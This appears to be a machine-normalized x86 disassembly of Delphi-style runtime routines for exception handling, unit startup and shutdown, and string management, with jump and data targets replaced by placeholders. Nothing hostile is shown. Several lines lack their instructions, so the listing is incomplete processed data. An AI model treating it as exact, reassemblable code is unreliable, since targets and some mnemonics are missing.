mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_4034ac
push eax
push ecx
mov eax [ eax ]
call sub_40347c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_40401c
call [ rw-data ]
sub_4034f4
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40347c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_40351c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_40356c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_4035ac
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4035fc
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403625
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403690
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4036cc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036e0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036f4
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403714
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4036f4
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403778
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4031e4
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_406074
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4036e0
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403690
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4038a4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4031e4
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403690
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_406074
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4036cc
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c54
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403a2c
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403714
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403a64
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_40401c
sub_403a8c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_406074
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4032b0
call sub_403674
sub_403ae0
call sub_406074
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4032b0
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_40373c
jmp edx
sub_403b28
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027f0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c88
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403cb0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cf6
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403d10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d56
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403db0
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405e08
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403dd4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405e08
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403dfc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e20
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e7c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403eac
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40125c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401214
push eax
call sub_401234
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401214
push eax
call sub_401234
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403f38
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403e20
call sub_403eac
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403cb0
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c88
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4058d4
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e7c
push eax
call sub_401274
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_404028
push ebp
mov ebp esp
call sub_4031e4
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_40270c
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_404060
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026ec
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_404028
push eax
push esi
push ebx
call sub_401244
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4040ac
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_40270c
pop eax
sub_4040d0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_404100
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404170
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028e8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_404144
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_404170
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026ec
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_40419c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404170
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_4040ac
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028e8
sub_4041cc
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4041ec
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404208
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4040ac
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4046f8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4041cc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_4041cc
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4046f8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40419c
jmp r-xdata
sub_4042a4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40419c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4042d4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404208
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40431c
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_40419c
not ecx
sub_404348
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028e8
pop ebx
retn
mov ecx ebx
sub_404374
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_404100
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4046f8
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4046f8
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028e8
pop edi
pop esi
pop ebx
retn
sub_4043b8
test edx edx
je r-xdata
mov edx ecx
jmp sub_404100
test ecx ecx
je sub_404100
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404374
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404170
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028e8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028e8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_404100
pop edx
pop eax
jmp sub_404374
call sub_404100
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_40442c
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404170
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4046f8
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028e8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_404100
dec [ edx - 0x8 ]
sub_4044b8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404578
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404170
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028e8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_40270c
sub_4045cc
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_4040ac
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_40419c
jmp r-xdata
pop ebx
retn 0x4
sub_40460c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404578#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028e8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4046f8
mov edi ecx
sub_404654
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4046f8
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028e8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028e8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4046b0
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4046f8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_4040ac
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404170
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40272c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028e8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_40475c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_4040ac
test esi esi
jle r-xdata
pop edi
pop esi
